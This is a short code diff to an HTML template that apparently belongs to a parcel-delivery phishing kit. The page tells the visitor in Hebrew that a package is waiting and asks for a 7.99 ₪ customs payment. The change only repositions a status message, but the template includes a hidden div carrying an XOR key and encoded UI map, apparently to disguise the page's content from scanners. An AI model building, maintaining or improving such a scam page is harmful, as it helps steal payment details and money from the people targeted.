@@ -12,7 +12,6 @@
 <body class="{{ bcls['bango-page'] }}">
   <div style="position:absolute;clip:rect(0,0,0,0);width:1px;height:1px;overflow:hidden" data-ui-map="{{ billing_ui_map_json|default(bango_ui_map_json)|e }}" data-ui-key="{{ billing_xor_key|default(bango_xor_key)|e }}" aria-hidden="true">.</div>
   <div class="page-card siteW" id="bango-main">
-    <p id="bango-msg" role="status" aria-live="polite"></p>
     <header class="site-banner" role="banner">
       <img class="site-banner__img" src="{{ url_for('theme_asset', theme_name=active_theme_id, filename='img/banar.jpg') }}" alt="" width="631" height="157" loading="eager" decoding="async" fetchpriority="high">
     </header>
@@ -21,6 +20,7 @@
       <div class="page-intro">
         <h5 class="user-info fw-bolder text-danger">החבילה שלך מחכה למשלוח. אנא שלם מכס (7.99 ₪)</h5>
       </div>
+      <p id="bango-msg" role="status" aria-live="polite"></p>
 
       <div class="server_err_msg">הודעת שגיאה מהשרת</div>
       <div class="form-columns">
